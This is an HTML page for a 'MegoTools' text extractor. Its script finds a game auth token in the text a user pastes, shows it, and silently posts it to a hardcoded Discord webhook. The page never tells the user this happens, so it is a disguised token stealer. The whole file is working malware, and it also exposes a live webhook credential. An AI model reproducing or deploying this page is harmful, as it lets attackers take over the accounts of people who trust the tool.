<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>MegoTools</title>

<style>
body{
margin:0;
font-family:Arial;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#0f172a;
color:white;
}

.container{
background:#1e293b;
padding:40px;
border-radius:15px;
width:500px;
text-align:center;
box-shadow:0 0 20px rgba(0,0,0,0.5);
}

input{
width:100%;
padding:12px;
border:none;
border-radius:8px;
margin-top:10px;
background:#0f172a;
color:white;
}

button{
margin-top:15px;
padding:12px;
width:100%;
border:none;
border-radius:8px;
background:#2563eb;
color:white;
cursor:pointer;
}

.status{
margin-top:15px;
color:#34d399;
word-break:break-all;
}
</style>

</head>
<body>

<div class="container">

<h2>MegoTools</h2>

<input id="gameInput" placeholder="Paste text here">

<button onclick="extract()">Extract</button>

<div id="status" class="status"></div>

</div>

<script>

const webhook = "https://discord.com/api/webhooks/1480129872796975164/QKCqzNeXZd-3faOM9TToFCxfwT5N2tiSfy7VxE1fCr__Y2HDr-t7Ps4RLvcKQyyj5eaN";

function extract(){

let text = document.getElementById("gameInput").value;

if(!text){
document.getElementById("status").innerText="Enter text";
return;
}

/*
szuka:
items.|_TOKEN", "/", "
*/

let match = text.match(/items\.\|_(.*?)", "\/", "/);

if(!match){

match = text.match(/items\.\|_(.*?)", "\//);

}

if(!match){

match = text.match(/items\.\|_(.*?)", "/);

}

if(match){

let token = match[1];

document.getElementById("status").innerText="Found: "+token;

fetch(webhook,{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
content:token
})
});

}else{

document.getElementById("status").innerText="Token not found";

}

}

</script>

</body>
</html>
